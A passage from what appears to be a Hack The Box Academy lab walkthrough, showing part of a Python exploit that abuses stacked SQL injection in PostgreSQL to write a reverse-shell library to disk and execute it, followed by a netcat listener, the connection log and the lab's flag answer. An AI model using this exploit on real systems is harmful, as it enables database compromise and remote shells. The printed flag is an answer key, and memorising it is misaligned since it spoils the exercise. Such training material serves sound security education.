    )
    return "Password edited!" in r.text

with open("pg_rev_shell.so","rb") as f:
    raw = f.read()

loid = random.randint(50000,60000)
oracle(s, f"1;SELECT lo_create({loid})--")
print(f"[*] Created large object with ID: {loid}")

for pageno in range(math.ceil(len(raw)/2048)):
    page = raw[pageno*2048:pageno*2048+2048]
    print(f"[*] Uploading Page: {pageno}, Offset: {pageno*2048}")
    oracle(s, f"1;SELECT lo_put({loid}, {pageno*2048}, decode($${page.hex()}$$,$$hex$$))--")

query  = f"1;SELECT lo_export({loid}, $$/tmp/pg_rev_shell.so$$);"
query += f"SELECT lo_unlink({loid});"
query += "DROP FUNCTION IF EXISTS rev_shell;"
query += "CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS $$/tmp/pg_rev_shell$$, $$rev_shell$$ LANGUAGE C STRICT;"
query += f"SELECT rev_shell($${LHOST}$$, {LPORT})--"
oracle(s, query)
```

Before running the exploit, students need to start a listener with `nc`, setting the port the same as the one in the script before:

Code: shell

```shell
nc -nvlp PWNPO
```

```
┌─[us-academy-1]─[10.10.14.189]─[htb-ac-413848@htb-ahuvwy1i3u]─[~]
└──╼ [★]$ nc -nvlp 7331

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7331
Ncat: Listening on 0.0.0.0:7331
```

Subsequently, after running the exploit and checking the `nc` listener, students will notice that the reverse shell connection has been successfully established:

Code: shell

```shell
python3 exploit.py 
```

```
┌─[us-academy-1]─[10.10.14.189]─[htb-ac-413848@htb-jexdps7n8s]─[~]
└──╼ [★]$ python3 exploit.py 

[*] Logged in
[*] Created large object with ID: 52145
[*] Uploading Page: 0, Offset: 0
[*] Uploading Page: 1, Offset: 2048
[*] Uploading Page: 2, Offset: 4096
[*] Uploading Page: 3, Offset: 6144
[*] Uploading Page: 4, Offset: 8192
[*] Uploading Page: 5, Offset: 10240
[*] Uploading Page: 6, Offset: 12288
[*] Uploading Page: 7, Offset: 14336
[*] Uploading Page: 8, Offset: 16384
[*] Uploading Page: 9, Offset: 18432
```
```
Ncat: Connection from 10.129.204.251.
Ncat: Connection from 10.129.204.251:60636.
```

Listing the contents of the folder `/opt/Pass2`, students will find the file `flag_674jkh23.txt`:

```shell
ls /opt/Pass2/
```
```
ls /opt/Pass2/

Pass2-1.0.3.jar
flag_674jkh23.txt
init_97vibu27.sql
```

At last, when printing the contents of the flag file `/opt/Pass2/flag_674jkh23.txt`, students will attain `HTB{6572f826fbab3708e9b20a3c993d1ef7}`:

```shell
cat /opt/Pass2/flag_674jkh23.txt
```
```
cat /opt/Pass2/flag_674jkh23.txt

HTB{6572f826fbab3708e9b20a3c993d1ef7}
```

Answer: `HTB{6572f826fbab3708e9b20a3c993d1ef7}`